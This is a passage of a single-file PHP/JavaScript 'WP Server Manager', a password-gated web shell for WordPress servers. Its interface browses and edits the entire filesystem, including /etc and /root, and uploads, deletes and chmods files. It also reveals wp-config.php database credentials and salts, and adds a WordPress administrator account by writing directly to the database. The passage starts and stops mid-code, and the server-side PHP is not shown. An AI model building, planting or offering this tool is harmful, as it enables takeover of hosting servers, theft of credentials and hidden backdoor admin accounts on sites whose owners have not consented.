                                                                            .ci{padding:7px 14px;font-size:12px;cursor:pointer;display:flex;align-items:center;gap:8px}
                                                                            .ci:hover{background:var(--s3)}
                                                                            .ci.red{color:var(--red)}
                                                                            .cs{border-top:1px solid var(--b1);margin:3px 0}

                                                                            /* MODAL */
                                                                            .mbg{position:fixed;inset:0;background:rgba(0,0,0,.8);z-index:2000;
                                                                                display:none;align-items:center;justify-content:center}
                                                                                .mbg.show{display:flex}
                                                                                .modal{background:var(--s1);border:1px solid var(--b1);border-radius:11px;
                                                                                    padding:22px;min-width:320px;max-width:500px;width:90%}
                                                                                    .modal h3{font-size:13px;font-weight:700;margin-bottom:12px}
                                                                                    .modal input,.modal select,.modal textarea{
                                                                                        width:100%;padding:8px 10px;background:var(--bg);border:1px solid var(--b1);
                                                                                        border-radius:var(--r);color:var(--fg);font-family:var(--mono);font-size:12px;outline:none;margin-bottom:8px}
                                                                                        .modal input:focus,.modal select:focus{border-color:var(--cyan)}
                                                                                        .modal p{font-size:12px;color:var(--dim);margin-bottom:8px;line-height:1.6}
                                                                                        .mact{display:flex;gap:6px;justify-content:flex-end;margin-top:4px}
                                                                                        .bcn{padding:6px 13px;background:transparent;border:1px solid var(--b1);
                                                                                            color:var(--muted);border-radius:var(--r);cursor:pointer;font-size:12px;font-family:var(--sans)}
                                                                                            .bcn:hover{border-color:var(--fg);color:var(--fg)}
                                                                                            .bco{padding:6px 13px;background:var(--green);color:#000;border:none;
                                                                                                border-radius:var(--r);cursor:pointer;font-weight:700;font-size:12px;font-family:var(--sans)}
                                                                                                .bco.red{background:var(--red);color:#fff}
                                                                                                .bco.hide{display:none}

                                                                                                /* PAGE PANELS */
                                                                                                .pg{padding:22px;overflow-y:auto;height:100%}
                                                                                                .pg h2{font-size:16px;font-weight:800;margin-bottom:16px}
                                                                                                .cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:12px;margin-bottom:20px}
                                                                                                .card{background:var(--s1);border:1px solid var(--b1);border-radius:9px;padding:16px}
                                                                                                .card h4{font-size:10px;text-transform:uppercase;letter-spacing:1px;color:var(--muted);margin-bottom:5px}
                                                                                                .card .cv{font-size:17px;font-weight:800;color:var(--green);word-break:break-all}
                                                                                                .card .cv.sm{font-size:12px;font-family:var(--mono)}
                                                                                                .card .cv.warn{color:var(--amber)}.card .cv.bad{color:var(--red)}
                                                                                                .card .cs{font-size:11px;color:var(--muted);margin-top:3px;font-family:var(--mono)}
                                                                                                .tbl{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:12px;margin-bottom:18px}
                                                                                                .tbl th{text-align:left;padding:8px 11px;background:var(--s2);color:var(--muted);font-size:10px;text-transform:uppercase;letter-spacing:1px}
                                                                                                .tbl td{padding:8px 11px;border-bottom:1px solid var(--b1)}
                                                                                                .tbl td:first-child{color:var(--cyan);font-weight:600;min-width:130px}
                                                                                                .blur{filter:blur(5px);cursor:pointer;transition:filter .2s}.blur:hover{filter:none}
                                                                                                .fbox{background:var(--s1);border:1px solid var(--b1);border-radius:9px;padding:20px;max-width:440px;margin-bottom:18px}
                                                                                                .fbox h3{font-size:13px;font-weight:700;margin-bottom:12px}
                                                                                                .fr{margin-bottom:11px}
                                                                                                .fr label{display:block;font-size:10px;text-transform:uppercase;letter-spacing:1px;color:var(--muted);margin-bottom:4px}
                                                                                                .fr input{width:100%;padding:8px 11px;background:var(--bg);border:1px solid var(--b1);
                                                                                                    border-radius:var(--r);color:var(--fg);font-family:var(--mono);font-size:12px;outline:none}
                                                                                                    .fr input:focus{border-color:var(--green)}
                                                                                                    .fmsg{padding:8px 11px;border-radius:var(--r);font-size:12px;margin-top:9px}
                                                                                                    .fmsg.ok{background:rgba(61,220,132,.1);border:1px solid rgba(61,220,132,.3);color:var(--green)}
                                                                                                    .fmsg.er{background:rgba(244,63,94,.1);border:1px solid rgba(244,63,94,.3);color:var(--red)}
                                                                                                    .sbar{display:flex;gap:6px;margin-bottom:6px}
                                                                                                    .sbar input{flex:1;padding:8px 11px;background:var(--s1);border:1px solid var(--b1);
                                                                                                        border-radius:var(--r);color:var(--fg);font-family:var(--mono);font-size:12px;outline:none}
                                                                                                        .sbar input:focus{border-color:var(--cyan)}
                                                                                                        .sbar select{padding:8px 9px;background:var(--s1);border:1px solid var(--b1);
                                                                                                            border-radius:var(--r);color:var(--fg);font-size:12px;outline:none;font-family:var(--sans)}
                                                                                                            .sr{display:flex;align-items:center;gap:8px;padding:8px 11px;border-bottom:1px solid var(--b1);
                                                                                                                font-size:12px;font-family:var(--mono);cursor:pointer;transition:background .1s}
                                                                                                                .sr:hover{background:var(--s2)}
                                                                                                                .sr .srp{color:var(--muted);font-size:10px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
                                                                                                                .sr .srsz{color:var(--dim);font-size:10px;min-width:46px;text-align:right}
                                                                                                                .sgrid{display:grid;grid-template-columns:1fr 1fr;gap:5px 14px;font-family:var(--mono);font-size:12px}
                                                                                                                .sgrid .sk{color:var(--muted)}.sgrid .sv{color:var(--fg)}
                                                                                                                </style>
                                                                                                                </head>
                                                                                                                <body>
                                                                                                                <?php if(!$logged): ?>
                                                                                                                <div class="login">
                                                                                                                <div class="lb">
                                                                                                                <div class="ico">🖥️</div>
                                                                                                                <h1>WP Server Manager</h1>
                                                                                                                <p class="sub">Full server filesystem access · Authorized use only</p>
                                                                                                                <?php if(isset($err)):?><div class="lb-err">⚠️ <?=htmlspecialchars($err)?></div><?php endif?>
                                                                                                                <form method="POST">
                                                                                                                <label>Password</label>
                                                                                                                <input type="password" name="pw" placeholder="••••••••••••" autofocus>
                                                                                                                <button class="lb-btn" type="submit">Enter →</button>
                                                                                                                </form>
                                                                                                                <p class="lb-note">🔒 Provides access to the entire server filesystem.<br>Delete this file from your server immediately after use.</p>
                                                                                                                </div>
                                                                                                                </div>
                                                                                                                <?php else: ?>
                                                                                                                <div class="app">
                                                                                                                <div class="top">
                                                                                                                <span class="brand">WP<span>Manager</span></span>
                                                                                                                <button class="tbtn on" onclick="tab('files',this)">📁 Files</button>
                                                                                                                <button class="tbtn" onclick="tab('dash',this)">📊 Server Info</button>
                                                                                                                <button class="tbtn" onclick="tab('wpc',this)">⚙️ WP Config</button>
                                                                                                                <button class="tbtn" onclick="tab('adm',this)">👤 Add Admin</button>
                                                                                                                <button class="tbtn" onclick="tab('srch',this)">🔍 Search</button>
                                                                                                                <div class="ml">
                                                                                                                <span class="timer">Session: <span id="tmr">30:00</span></span>
                                                                                                                <a href="?out=1"><button class="obtn">Logout</button></a>
                                                                                                                </div>
                                                                                                                </div>

                                                                                                                <div style="height:calc(100vh - 46px);overflow:hidden">

                                                                                                                <!-- ══ FILES ══ -->
                                                                                                                <div class="panel on" id="p-files">
                                                                                                                <div class="fm">
                                                                                                                <div class="sb">
                                                                                                                <div class="sb-cwd" onclick="editPath()" title="Click to navigate to a path">📂 <span id="cwdTxt">/</span></div>
                                                                                                                <div class="qnav">
                                                                                                                <button class="qb" onclick="go('/')">/ root</button>
                                                                                                                <button class="qb" onclick="go('/home')">/home</button>
                                                                                                                <button class="qb" onclick="go('/etc')">/etc</button>
                                                                                                                <button class="qb" onclick="go('/var')">/var</button>
                                                                                                                <button class="qb" onclick="go('/var/www')">/www</button>
                                                                                                                <button class="qb" onclick="go('/var/log')">/log</button>
                                                                                                                <button class="qb" onclick="go('/tmp')">/tmp</button>
                                                                                                                <button class="qb" onclick="go('/root')">/root</button>
                                                                                                                <button class="qb" onclick="go('/usr')">/usr</button>
                                                                                                                <button class="qb" onclick="go('/proc')">/proc</button>
                                                                                                                <button class="qb" onclick="go('<?=addslashes(__DIR__)?>')">📄 WP</button>
                                                                                                                </div>
                                                                                                                <div class="sba">
                                                                                                                <button class="btn" onclick="goUp()">⬆ Up</button>
                                                                                                                <button class="btn" onclick="doMkDir()">📁 Dir</button>
                                                                                                                <button class="btn" onclick="doNewFile()">📄 File</button>
                                                                                                                <button class="btn" onclick="go(cwd)">↻ Reload</button>
                                                                                                                <button class="btn y" onclick="statInfo()">ℹ Stat</button>
                                                                                                                </div>
                                                                                                                <div class="dz" id="dz" onclick="document.getElementById('ufi').click()">
                                                                                                                <input type="file" id="ufi" multiple onchange="upload(this.files)">
                                                                                                                ⬆ Drop or click to upload
                                                                                                                </div>
                                                                                                                <div class="tree" id="tree"></div>
                                                                                                                </div>
                                                                                                                <div class="main">
                                                                                                                <div class="tbar">
                                                                                                                <button class="btn" onclick="goUp()">← Up</button>
                                                                                                                <input type="text" id="pbar" placeholder="Type any path: /etc/nginx/nginx.conf …" onkeydown="if(event.key==='Enter')go(this.value)">
                                                                                                                <button class="btn g" onclick="go(document.getElementById('pbar').value)">Go</button>
                                                                                                                </div>
                                                                                                                <div class="ewrap" id="earea">
                                                                                                                <div class="empty"><div class="ei">🗂</div>
                                                                                                                <p>Navigate to any directory — including /, /home, /etc, /var …<br>Click files to read · Right-click for options</p>
                                                                                                                </div>
                                                                                                                </div>
                                                                                                                <div class="stbar"><span id="stmsg" class="ok">Ready</span><span id="stex" style="margin-left:auto;color:var(--muted)"></span></div>
                                                                                                                </div>
                                                                                                                </div>
                                                                                                                </div>

                                                                                                                <!-- ══ DASH ══ -->
                                                                                                                <div class="panel" id="p-dash">
                                                                                                                <div class="pg" id="dashPg"><div style="color:var(--muted)">Loading…</div></div>
                                                                                                                </div>

                                                                                                                <!-- ══ WP CONFIG ══ -->
                                                                                                                <div class="panel" id="p-wpc">
                                                                                                                <div class="pg">
                                                                                                                <h2>⚙️ WordPress Configuration</h2>
                                                                                                                <p style="font-size:12px;color:var(--muted);margin-bottom:14px">Searches upward from path for wp-config.php · Hover password to reveal</p>
                                                                                                                <div style="display:flex;gap:6px;margin-bottom:16px">
                                                                                                                <input type="text" id="wpr" placeholder="Path to WP root, e.g. /var/www/html" value="<?=addslashes(__DIR__)?>"
                                                                                                                style="flex:1;padding:7px 10px;background:var(--s1);border:1px solid var(--b1);border-radius:var(--r);color:var(--fg);font-family:var(--mono);font-size:12px;outline:none">
                                                                                                                <button class="bco" onclick="loadWpCfg()">Read Config</button>
                                                                                                                </div>
                                                                                                                <table class="tbl" id="cfgT"><tr><th>Key</th><th>Value</th></tr>
                                                                                                                <tr><td colspan="2" style="color:var(--muted)">Enter path and click Read Config</td></tr>
                                                                                                                </table>
                                                                                                                </div>
                                                                                                                </div>

                                                                                                                <!-- ══ ADD ADMIN ══ -->
                                                                                                                <div class="panel" id="p-adm">
                                                                                                                <div class="pg">
                                                                                                                <h2>👤 Add WordPress Administrator</h2>
                                                                                                                <div class="fbox">
                                                                                                                <h3>New Admin Account</h3>
                                                                                                                <p style="font-size:12px;color:var(--muted);margin-bottom:12px">Writes directly to the WordPress MySQL database using wp-config.php credentials.</p>
                                                                                                                <div class="fr"><label>WP Root (containing wp-config.php)</label><input type="text" id="ar" value="<?=addslashes(__DIR__)?>"></div>
                                                                                                                <div class="fr"><label>Username</label><input type="text" id="au" placeholder="new_admin"></div>
                                                                                                                <div class="fr"><label>Email</label><input type="email" id="ae" placeholder="admin@site.com"></div>
                                                                                                                <div class="fr"><label>Password</label><input type="password" id="ap" placeholder="Strong password"></div>
                                                                                                                <div class="fr"><label>Confirm Password</label><input type="password" id="ap2" placeholder="Repeat password"></div>
                                                                                                                <button class="bco" onclick="addAdmin()">Create Administrator</button>
                                                                                                                <div id="amsg"></div>
                                                                                                                </div>
                                                                                                                </div>
                                                                                                                </div>

                                                                                                                <!-- ══ SEARCH ══ -->
                                                                                                                <div class="panel" id="p-srch">
                                                                                                                <div class="pg">
                                                                                                                <h2>🔍 Search Filesystem</h2>
                                                                                                                <div class="sbar">
                                                                                                                <input type="text" id="sq" placeholder="Search term…" onkeydown="if(event.key==='Enter')doSearch()">
                                                                                                                <select id="sm"><option value="name">By filename</option><option value="content">By file content</option></select>
                                                                                                                <button class="bco" onclick="doSearch()">Search</button>
                                                                                                                </div>
                                                                                                                <p style="font-size:11px;color:var(--muted);margin-bottom:12px">
                                                                                                                Searching in: <span id="spath" style="color:var(--cyan)">/</span>
                                                                                                                &nbsp;·&nbsp; Max depth: 8 &nbsp;·&nbsp; Content search: files &lt;512 KB
                                                                                                                </p>
                                                                                                                <div id="sres"></div>
                                                                                                                </div>
                                                                                                                </div>

                                                                                                                </div>
                                                                                                                </div>

                                                                                                                <!-- CTX MENU -->
                                                                                                                <div class="ctx" id="ctx">
                                                                                                                <div class="ci" onclick="ctxOpen()">📂 Open / Edit</div>
                                                                                                                <div class="ci" onclick="ctxRename()">📝 Rename</div>
                                                                                                                <div class="ci" onclick="ctxChmod()">🔐 Change Permissions</div>
                                                                                                                <div class="ci" onclick="ctxStatC()">ℹ️ Properties</div>
                                                                                                                <div class="cs"></div>
                                                                                                                <div class="ci" onclick="doNewFileHere()">📄 New File Here</div>
                                                                                                                <div class="ci" onclick="doMkDirHere()">📁 New Folder Here</div>
                                                                                                                <div class="cs"></div>
                                                                                                                <div class="ci red" onclick="ctxDelete()">🗑 Delete</div>
                                                                                                                </div>

                                                                                                                <!-- MODAL -->
                                                                                                                <div class="mbg" id="mbg" onclick="if(event.target===this)closeM()">
                                                                                                                <div class="modal">
                                                                                                                <h3 id="mt"></h3>
                                                                                                                <div id="mb"></div>
                                                                                                                <div class="mact">
                                                                                                                <button class="bcn" onclick="closeM()">Cancel</button>
                                                                                                                <button class="bco" id="mok">OK</button>
                                                                                                                </div>
                                                                                                                </div>
                                                                                                                </div>

                                                                                                                <script>
                                                                                                                let cwd='<?=addslashes(__DIR__)?>',selI=null,ctxI=null,mCb=null,sesL=<?=SESSION_TIMEOUT?>;

                                                                                                                // TIMER
                                                                                                                setInterval(()=>{sesL--;if(sesL<=0)location.reload();
                                                                                                                    document.getElementById('tmr').textContent=String(Math.floor(sesL/60)).padStart(2,'0')+':'+String(sesL%60).padStart(2,'0');
                                                                                                                },1000);

                                                                                                                // TABS
                                                                                                                function tab(n,b){
                                                                                                                    document.querySelectorAll('.panel').forEach(p=>p.classList.remove('on'));
                                                                                                                    document.querySelectorAll('.tbtn').forEach(x=>x.classList.remove('on'));
                                                                                                                    document.getElementById('p-'+n).classList.add('on'); b.classList.add('on');
                                                                                                                    if(n==='dash') loadDash();
                                                                                                                    if(n==='srch') document.getElementById('spath').textContent=cwd;
                                                                                                                    if(n==='wpc')  document.getElementById('wpr').value=cwd;
                                                                                                                    if(n==='adm')  document.getElementById('ar').value=cwd;
                                                                                                                }

                                                                                                                // API
                                                                                                                async function api(d){
                                                                                                                    const fd=new FormData();
                                                                                                                    for(const[k,v] of Object.entries(d))fd.append(k,v);
                                                                                                                    return (await fetch(location.pathname,{method:'POST',body:fd})).json();
                                                                                                                }
                                                                                                                async function apiFd(fd){return(await fetch(location.pathname,{method:'POST',body:fd})).json();}

                                                                                                                // ── NAV ──
                                                                                                                async function go(path){
                                                                                                                    path=(path||'/').trim()||'/';
                                                                                                                    st('Navigating to '+path+'…');
                                                                                                                    const d=await api({action:'list',path});
                                                                                                                    if(d.error){st(d.error,1);return;}
                                                                                                                    cwd=d.path;
                                                                                                                    document.getElementById('cwdTxt').textContent=cwd;
                                                                                                                    document.getElementById('pbar').value=cwd;
                                                                                                                    document.getElementById('spath').textContent=cwd;
                                                                                                                    render(d.items,d.writable);
                                                                                                                    showEmpty();
                                                                                                                    st('📂 '+cwd+'  ('+d.items.length+' items)'+(d.writable?' · ✏ writable':' · 🔒 read-only'));
                                                                                                                }
                                                                                                                function goUp(){const p=cwd.replace(/\/+$/,'');go(p.substring(0,p.lastIndexOf('/'))||'/');}

                                                                                                                function editPath(){
                                                                                                                    showM('Go to path',`<input type="text" id="mi" value="${ex(cwd)}" placeholder="/var/www/html">`,()=>go(vi('mi')));
                                                                                                                }

                                                                                                                // ── RENDER ──
                                                                                                                function render(items){
                                                                                                                    const t=document.getElementById('tree');t.innerHTML='';
                                                                                                                    items.forEach(item=>{
                                                                                                                        const d=document.createElement('div');d.className='fi';
                                                                                                                    if(item.isLink)d.classList.add('lnk');
                                                                                                                    const rwc=item.readable&&item.writable?'brw':item.readable?'br':item.writable?'bw':'bno';
                                                                                                                        const rwl=item.readable&&item.writable?'rw':item.readable?'r':item.writable?'w':'✗';
                                                                                                                    d.innerHTML=`<span>${fIcon(item)}</span>
                                                                                                                    <span class="fnm" title="${ex(item.path)}">${ex(item.name)}${item.isLink?'<span style="color:var(--purple)"> →'+ex(item.linkTarget)+'</span>':''}</span>
                                                                                                                    <span class="fpr">${item.perms}</span>
                                                                                                                    <span><span class="badge ${rwc}">${rwl}</span></span>
                                                                                                                    <span class="fsz">${item.size}</span>
                                                                                                                    <span class="fdt">${item.modified}</span>`;
                                                                                                                    d.addEventListener('click',(e)=>{e.stopPropagation();handleClick(item,d);});
                                                                                                                    d.addEventListener('contextmenu',e=>{e.preventDefault();e.stopPropagation();showCtx(e,item);});
                                                                                                                    t.appendChild(d);
                                                                                                                    });
                                                                                                                }
                                                                                                                function fIcon(i){
                                                                                                                    if(i.name==='..') return '⬆';
                                                                                                                    if(i.isLink) return '🔗';
                                                                                                                    if(i.type==='dir') return '📁';
                                                                                                                    const ext=(i.name.split('.').pop()||'').toLowerCase();
                                                                                                                    const icons={php:'🐘',js:'📜',ts:'📘',jsx:'⚛',tsx:'⚛',css:'🎨',scss:'🎨',
                                                                                                                        html:'🌐',htm:'🌐',json:'📋',xml:'📋',yaml:'📋',yml:'📋',
                                                                                                                        md:'📝',txt:'📄',sh:'⚙',bash:'⚙',py:'🐍',rb:'💎',
                                                                                                                        sql:'🗄',log:'📋',ini:'⚙',conf:'⚙',cfg:'⚙',env:'🔑',
                                                                                                                        htaccess:'🔒',htpasswd:'🔒',
                                                                                                                        jpg:'🖼',jpeg:'🖼',png:'🖼',gif:'🖼',svg:'🎭',ico:'🖼',webp:'🖼',
                                                                                                                        zip:'📦',tar:'📦',gz:'📦',bz2:'📦',so:'⚙',bin:'⚙'};
                                                                                                                        return icons[ext]||'📄';
                                                                                                                }

                                                                                                                async function handleClick(item,el){
                                                                                                                    document.querySelectorAll('.fi').forEach(f=>f.classList.remove('sel'));
                                                                                                                    el.classList.add('sel'); selI=item;
                                                                                                                    if(item.name==='..'){goUp();return;}
                                                                                                                    if(item.type==='dir'){go(item.path);return;}
                                                                                                                    await openFile(item);
                                                                                                                }

                                                                                                                // ── EDITOR ──
                                                                                                                async function openFile(item){
                                                                                                                    st('Reading '+item.path+'…');
                                                                                                                    const d=await api({action:'read',path:item.path});
                                                                                                                    if(d.error){st(d.error,1);showEmpty(d.error);return;}
                                                                                                                    selI={...item,writable:d.writable,perms:d.perms};
                                                                                                                    const a=document.getElementById('earea');
                                                                                                                    const wt=d.writable?'<span class="ew">✏ writable</span>':'<span class="er2">🔒 read-only</span>';
                                                                                                                    a.innerHTML=`
                                                                                                                    <div class="einfo">
                                                                                                                    <span class="ep" title="${ex(d.path)}">${ex(d.path)}</span>
                                                                                                                    <span>${d.perms}</span>${wt}
                                                                                                                    <span id="elc">-</span><span id="ecc">-</span>
                                                                                                                    <span>${d.size}</span>
                                                                                                                    </div>
                                                                                                                    <textarea id="ed" spellcheck="false" ${d.writable?'':'readonly'}
                                                                                                                    oninput="edInfo()" onkeydown="edKey(event)">${exH(d.content)}</textarea>
                                                                                                                    <div class="eacts">
                                                                                                                    ${d.writable
                                                                                                                        ?`<button class="btn g" onclick="saveFile('${ex(d.path)}')">💾 Save</button>`
                                                                                                                        :`<span style="color:var(--red);font-size:11px;padding:3px 6px">🔒 read-only — chmod to write</span>`}
                                                                                                                        <button class="btn" onclick="ctxChmod()">🔐 Chmod</button>
                                                                                                                        <button class="btn" onclick="ctxRename()">📝 Rename</button>
                                                                                                                        <button class="btn y" onclick="ctxStatC()">ℹ Stat</button>
                                                                                                                        <button class="btn r" onclick="ctxDelete()">🗑 Delete</button>
                                                                                                                        </div>`;
                                                                                                                        edInfo();
                                                                                                                        st((d.writable?'✏ Writable':'🔒 Read-only')+': '+d.path);
                                                                                                                }
                                                                                                                function edInfo(){const t=document.getElementById('ed');if(!t)return;
                                                                                                                    const lines=(t.value.match(/\n/g)||[]).length+1;
                                                                                                                    const chars=t.value.length;
                                                                                                                    document.getElementById('elc').textContent=lines+' lines';
                                                                                                                    document.getElementById('ecc').textContent=chars+' chars';
                                                                                                                }
                                                                                                                function edKey(e){if(e.key==='Tab'){e.preventDefault();const t=e.target,s=t.selectionStart;
                                                                                                                    t.value=t.value.substring(0,s)+'  '+t.value.substring(t.selectionEnd);
                                                                                                                    t.selectionStart=t.selectionEnd=s+2;edInfo();}}

                                                                                                                    async function saveFile(p){
                                                                                                                        const t=document.getElementById('ed');if(!t)return;st('Saving…');
                                                                                                                        const d=await api({action:'save',path:p,content:t.value});
                                                                                                                        if(d.success){st(d.success);if(d.success.includes('Saved'))edInfo();}
                                                                                                                        else st(d.error,1);
                                                                                                                    }

                                                                                                                    function showEmpty(msg){
                                                                                                                        document.getElementById('earea').innerHTML=`<div class="empty"><div class="ei">🗂</div>
                                                                                                                        <p>${msg||'Select a file to read · Right-click for more options'}</p></div>`;
                                                                                                                    }

                                                                                                                    // ── UPLOAD ──
                                                                                                                    const dze=document.getElementById('dz');
                                                                                                                    dze.addEventListener('dragover',e=>{e.preventDefault();dze.classList.add('ov');});
                                                                                                                    dze.addEventListener('dragleave',()=>dze.classList.remove('ov'));
                                                                                                                    dze.addEventListener('drop',e=>{e.preventDefault();dze.classList.remove('ov');upload(e.dataTransfer.files);});
                                                                                                                    async function upload(files){
                                                                                                                        for(const f of files){st('Uploading '+f.name+'…');
                                                                                                                            const fd=new FormData();fd.append('action','upload');fd.append('path',cwd);fd.append('file',f);
                                                                                                                            const d=await apiFd(fd);st(d.success||d.error,!!d.error);}
                                                                                                                            go(cwd);
                                                                                                                    }

                                                                                                                    // ── CTX ──
                                                                                                                    function showCtx(e,item){ctxI=item;selI=item;
                                                                                                                        const m=document.getElementById('ctx');
                                                                                                                        m.style.left=Math.min(e.pageX,window.innerWidth-175)+'px';
                                                                                                                        m.style.top=Math.min(e.pageY,window.innerHeight-210)+'px';
                                                                                                                        m.classList.add('show');}
                                                                                                                        document.addEventListener('click',(e)=>{if(!e.target.closest('.ci'))document.getElementById('ctx').classList.remove('show');});
                                                                                                                        function ctxOpen(){const i=ctxI||selI;if(!i)return;if(i.type==='dir')go(i.path);else openFile(i);}
                                                                                                                        function ctxRename(){const i=ctxI||selI;if(!i)return;
                                                                                                                            showM('Rename',`<input type="text" id="mi" value="${ex(i.name)}">`,async()=>{
                                                                                                                                const n=vi('mi').trim();if(!n||n==='.'||n==='..'){st('Invalid name',1);return;}
                                                                                                                                const d=await api({action:'rename',path:i.path,new_name:n});st(d.success||d.error,!!d.error);go(cwd);});}
                                                                                                                                function ctxChmod(){const i=ctxI||selI;if(!i)return;
                                                                                                                                    showM('Change Permissions — '+ex(i.name),`
                                                                                                                                    <p>Current: <b>${i.perms||'?'}</b></p>
                                                                                                                                    <select id="msel">
                                                                                                                                    <option value="644">644 — rw-r--r-- (files)</option>
                                                                                                                                    <option value="755">755 — rwxr-xr-x (dirs/scripts)</option>
                                                                                                                                    <option value="600">600 — rw------- (private)</option>
                                                                                                                                    <option value="640">640 — rw-r-----</option>
                                                                                                                                    <option value="664">664 — rw-rw-r--</option>
                                                                                                                                    <option value="666">666 — rw-rw-rw-</option>
                                                                                                                                    <option value="700">700 — rwx------</option>
                                                                                                                                    <option value="775">775 — rwxrwxr-x</option>
                                                                                                                                    <option value="777">777 — rwxrwxrwx ⚠️</option>
                                                                                                                                    <option value="400">400 — r--------</option>
                                                                                                                                    <option value="444">444 — r--r--r--</option>
                                                                                                                                    </select>
                                                                                                                                    <p style="margin-top:6px">Custom octal (overrides above):</p>
                                                                                                                                    <input type="text" id="mi" placeholder="e.g. 750" maxlength="4">`,
                                                                                                                                    async()=>{
                                                                                                                                        const sel=document.getElementById('msel').value,inp=vi('mi').trim();
                                                                                                                                        const mode=inp||sel;
                                                                                                                                        if(!/^[0-7]{3,4}$/.test(mode)){st('Invalid mode (use 3-4 octal digits)',1);return;}
                                                                                                                                        const d=await api({action:'chmod',path:i.path,mode});st(d.success||d.error,!!d.error);go(cwd);});}
                                                                                                                                        async function ctxStatC(){await statInfo((ctxI||selI)?.path);}
                                                                                                                                        async function statInfo(path){
                                                                                                                                            path=path||cwd;
                                                                                                                                            const d=await api({action:'stat',path});if(d.error){st(d.error,1);return;}
                                                                                                                                            showM('Properties',`<div class="sgrid">
                                                                                                                                            <span class="sk">Path</span><span class="sv" style="word-break:break-all">${ex(d.path)}</span>
                                                                                                                                            <span class="sk">Type</span><span class="sv">${d.type}</span>
                                                                                                                                            <span class="sk">Size</span><span class="sv">${d.size}</span>
                                                                                                                                            <span class="sk">Permissions</span><span class="sv">${d.perms}</span>
                                                                                                                                            <span class="sk">Owner</span><span class="sv">${d.owner} : ${d.group}</span>
                                                                                                                                            <span class="sk">Readable</span><span class="sv" style="color:${d.readable?'var(--green)':'var(--red)'}">${d.readable?'Yes':'No'}</span>
                                                                                                                                            <span class="sk">Writable</span><span class="sv" style="color:${d.writable?'var(--green)':'var(--red)'}">${d.writable?'Yes':'No'}</span>
                                                                                                                                            <span class="sk">Modified</span><span class="sv">${d.mtime}</span>
                                                                                                                                            <span class="sk">Accessed</span><span class="sv">${d.atime}</span>
                                                                                                                                            ${d.link?`<span class="sk">Symlink →</span><span class="sv">${ex(d.link)}</span>`:''}
                                                                                                                                            </div>`,null,true);}
                                                                                                                                            function ctxDelete(){const i=ctxI||selI;if(!i)return;
                                                                                                                                                showM('Confirm Delete',`<p style="color:var(--red)">Delete <b>${ex(i.name)}</b>?${i.type==='dir'?'<br><br>⚠️ Recursively deletes ALL contents!':''}`,
                                                                                                                                                      async()=>{const d=await api({action:'delete',path:i.path});st(d.success||d.error,!!d.error);go(cwd);showEmpty();},'red');}
                                                                                                                                                      function doMkDir(){showM('New Directory',`<input type="text" id="mi" placeholder="folder-name">`,async()=>{
                                                                                                                                                          const n=vi('mi').trim();if(!n||n==='.'||n==='..'){st('Invalid name',1);return;}
                                                                                                                                                          const d=await api({action:'mkdir',path:cwd+'/'+n});st(d.success||d.error,!!d.error);go(cwd);});}
                                                                                                                                                          function doMkDirHere(){ctxI=null;doMkDir();}
                                                                                                                                                          function doNewFile(){showM('New File',`<input type="text" id="mi" placeholder="filename.php">`,async()=>{
                                                                                                                                                              const n=vi('mi').trim();if(!n||n.includes('/')){st('Invalid filename',1);return;}
                                                                                                                                                              const d=await api({action:'newfile',path:cwd+'/'+n});st(d.success||d.error,!!d.error);go(cwd);});}
                                                                                                                                                              function doNewFileHere(){ctxI=null;doNewFile();}

                                                                                                                                                              // ── DASH ──
                                                                                                                                                              async function loadDash(){
                                                                                                                                                                  const d=await api({action:'diskinfo',path:cwd});
                                                                                                                                                                  document.getElementById('dashPg').innerHTML=`
                                                                                                                                                                  <h2>📊 Server Information</h2>
                                                                                                                                                                  <div class="cards">
                                                                                                                                                                  <div class="card"><h4>Disk Free</h4><div class="cv">${d.free}</div><div class="cs">Total: ${d.total}</div></div>
                                                                                                                                                                  <div class="card"><h4>PHP Version</h4><div class="cv">${d.php}</div></div>
                                                                                                                                                                  <div class="card"><h4>Process User</h4><div class="cv sm">${d.user}&nbsp;<span style="color:var(--muted)">(uid ${d.uid})</span></div></div>
                                                                                                                                                                  <div class="card"><h4>Web Server</h4><div class="cv sm">${d.server}</div></div>
                                                                                                                                                                  <div class="card"><h4>OS</h4><div class="cv sm">${d.os}</div></div>
                                                                                                                                                                  <div class="card"><h4>Upload Limit</h4><div class="cv">${d.ini_upload}</div><div class="cs">POST: ${d.ini_post} · Mem: ${d.ini_mem} · Max exec: ${d.max_exec}s</div></div>
                                                                                                                                                                  <div class="card"><h4>Script Dir</h4><div class="cv sm">${d.cwd}</div></div>
                                                                                                                                                                  <div class="card"><h4>⚠️ Manager File</h4><div class="cv sm warn">${d.self}</div><div class="cs bad">Delete after use!</div></div>
                                                                                                                                                                  </div>
                                                                                                                                                                  ${d.disable_fn?`<div class="card" style="grid-column:1/-1;max-width:700px"><h4>Disabled PHP Functions</h4><div style="font-family:var(--mono);font-size:11px;color:var(--amber);margin-top:4px;line-height:1.7">${d.disable_fn}</div></div>`:''}
                                                                                                                                                                  <div class="card" style="grid-column:1/-1"><h4>Loaded PHP Extensions</h4><div style="font-family:var(--mono);font-size:10px;color:var(--dim);margin-top:4px;line-height:1.8">${d.ext_list}</div></div>`;
                                                                                                                                                              }

                                                                                                                                                              // ── WP CONFIG ──
                                                                                                                                                              async function loadWpCfg(){
                                                                                                                                                                  const d=await api({action:'wpconfig',path:document.getElementById('wpr').value||cwd});
                                                                                                                                                                  if(d.error){document.getElementById('cfgT').innerHTML=`<tr><th>Key</th><th>Value</th></tr><tr><td colspan="2" style="color:var(--red)">${ex(d.error)}</td></tr>`;return;}
                                                                                                                                                                  let rows='<tr><th>Key</th><th>Value</th></tr>';
                                                                                                                                                                  for(const[k,v] of Object.entries(d)){
                                                                                                                                                                      const mask=k.toLowerCase().includes('pass')||k.includes('KEY')||k.includes('SALT');
                                                                                                                                                                      rows+=`<tr><td>${ex(k)}</td><td class="${mask?'blur':''}">${ex(String(v))}</td></tr>`;
                                                                                                                                                                  }
                                                                                                                                                                  document.getElementById('cfgT').innerHTML=rows;
                                                                                                                                                                  document.getElementById('ar').value=document.getElementById('wpr').value;
                                                                                                                                                              }

                                                                                                                                                              // ── ADD ADMIN ──
                                                                                                                                                              async function addAdmin(){
                                                                                                                                                                  const root=vi('ar'),user=vi('au'),mail=vi('ae'),pass=document.getElementById('ap').value,pass2=document.getElementById('ap2').value;
                                                                                                                                                                  const msg=document.getElementById('amsg');
